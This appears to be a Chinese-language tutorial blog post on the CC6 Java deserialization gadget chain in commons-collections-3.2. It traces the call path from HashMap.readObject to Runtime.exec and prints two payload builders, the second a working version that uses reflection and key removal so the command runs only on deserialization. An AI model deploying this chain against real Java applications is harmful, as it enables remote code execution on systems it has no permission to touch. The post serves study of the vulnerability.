## 运行环境

jdk版本：1.8.0_131

commons-collections-3.2

## 调用链

    
    
    /**  
    *    ObjectInputStream.readObject()  
    *         HashMap.readObject()  
    *                HashMap.put()  
    *                HashMap.hash()  
    *                   TiedMapEntry.hashCode()  
    *                   TiedMapEntry.getValue()  
    *                        LazyMap.get()  
    *                            ChainedTransformer.transform()  
    *                          ConstantTransformer.transform()  
    *                            InvokerTransformer.transform()  
    *                               Method.invoke()  
    *                                  Class.getMethod()  
    *                            InvokerTransformer.transform()  
    *                               Method.invoke()  
    *                              Runtime.getRuntime()  
    *                            InvokerTransformer.transform()  
    *                           Method.invoke()  
    *                              Runtime.exec()  
    * */

## 调用流程

### 危险方法执行链

依旧是通过LazyMap.get方法调用Transform[]列表对象执行transform()方法。

### TiedMapEntry

TiedMapEntry中的getValue()对Map类型的参数调用了其自身的get()方法，且Map类型的参数在可在构造TiedMapEntry时传入。

![1685024277_646f6e15ba235b03ebb3e.png!small?1685024277601](https://image.3001.net/images/20230525/1685024277_646f6e15ba235b03ebb3e.png!small?1685024277601)

  

  

  

  

  

  

  

  

  

TiedMapEntry内的hashCode()方法调用了this.getValue(),因此可以通过调用hashCode()方法间接调用getValue（）

![1685024376_646f6e7899dc6e5f76cc9.png!small?1685024376587](https://image.3001.net/images/20230525/1685024376_646f6e7899dc6e5f76cc9.png!small?1685024376587)

###  

###  

###  

###  

### HashMap

HashMap的readObject方法在最后调用了hash(),并将key作为参数传入。在hash()中调用了key的hashCode()方法。因此可以将TiedMapEnty对象作为key放入HashMap中，进行反序列。

![1685024857_646f705935dc309e7e840.png!small?1685024857278](https://image.3001.net/images/20230525/1685024857_646f705935dc309e7e840.png!small?1685024857278)

![1685024883_646f7073f39c118cade6c.png!small?1685024883769](https://image.3001.net/images/20230525/1685024883_646f7073f39c118cade6c.png!small?1685024883769)

  

  

  

  

  

  

  

  

  

  

  

依据上述流程简单构造playload如下

    
    
    private void cc6_test() throws Exception{  
    Transformer[] Transformer = new Transformer[]{  
    new ConstantTransformer(Runtime.class),  
    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),  
    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),  
    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})  
      
    };  
    ChainedTransformer C = new ChainedTransformer(Transformer);  
      
    HashMap <Object,Object> a = new HashMap<>();  
      
    Map<Object,Object> map = LazyMap.decorate(a,C);  
      
    TiedMapEntry entry = new TiedMapEntry(map,"aa");  
      
    HashMap<Object, Object> hashMap = new HashMap<Object,Object>();  
    hashMap.put(entry,"ccc");  
      
    //序列化  
    ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("c.bin"));  
    outputStream.writeObject(hashMap);  
    //反序列化  
    ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("c.bin"));  
    inputStream.readObject();  
      
    }

  

## 执行调试

先直接运行一下，发起确实弹出计算器。打断点调试发现并不是通过反序列化弹出的计算器。HashMap的put方法也会调用hash()方法，同时触发后续的执行方法弹出计算器。

![1685025873_646f7451e2c7e2f64f833.png!small?1685025873757](https://image.3001.net/images/20230525/1685025873_646f7451e2c7e2f64f833.png!small?1685025873757)

  

  

  

  

  

修改一下payload，构造LazyMap时传入一个正常的ChainedTransformer对象，在put后通过反射将ChainedTransformer改为危险函数执行链。

![1685026078_646f751e81377aec21163.png!small?1685026078369](https://image.3001.net/images/20230525/1685026078_646f751e81377aec21163.png!small?1685026078369)

  

  

  

  

  

  

  

  

put后通过反射，将LazyMap的“factory"属性改为包含危险函数执行链的ChainedTransformer对象。

再次运行发现没有任何反应，没有计算器弹出。继续调试。

发现在执行LazyMap的get()方法时没有通过if判断，这里的key为‘aa'。这里判断key在HashMap中是否有对应的映射，”aa“存在映射，返回为True，！True没有进入判断。

![1685027196_646f797c077bfe48b05ab.png!small?1685027195867](https://image.3001.net/images/20230525/1685027196_646f797c077bfe48b05ab.png!small?1685027195867)

  

  

  

  

  

  

  

把”aa“从HashMap中移除

![1685027591_646f7b071b28b6b6b09cd.png!small?1685027590927](https://image.3001.net/images/20230525/1685027591_646f7b071b28b6b6b09cd.png!small?1685027590927)

  

  

  

  

  

  

  

  

  

再次运行，成功执行弹出计算器。完整playload如下

    
    
    private void cc6_test() throws Exception{  
    Transformer[] Transformer = new Transformer[]{  
    new ConstantTransformer(Runtime.class),  
    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),  
    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),  
    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})  
      
    };  
    ChainedTransformer C = new ChainedTransformer(Transformer);  
      
    HashMap <Object,Object> a = new HashMap<>();  
      
    Map<Object,Object> map = LazyMap.decorate(a, new ConstantTransformer(1));  
      
    TiedMapEntry entry = new TiedMapEntry(map,"aa");  
      
    HashMap<Object, Object> hashMap = new HashMap<Object,Object>();  
    hashMap.put(entry,"ccc");  
      
    a.remove("aa");  
    Field field = LazyMap.class.getDeclaredField("factory");  
    field.setAccessible(true);  
    field.set(map,C);  
      
      
    //序列化  
    ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("c.bin"));  
    outputStream.writeObject(hashMap);  
    //反序列化  
    ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("c.bin"));  
    inputStream.readObject();  
      
    }

  

### 此条链在JDK1.7以及1.8中都适用

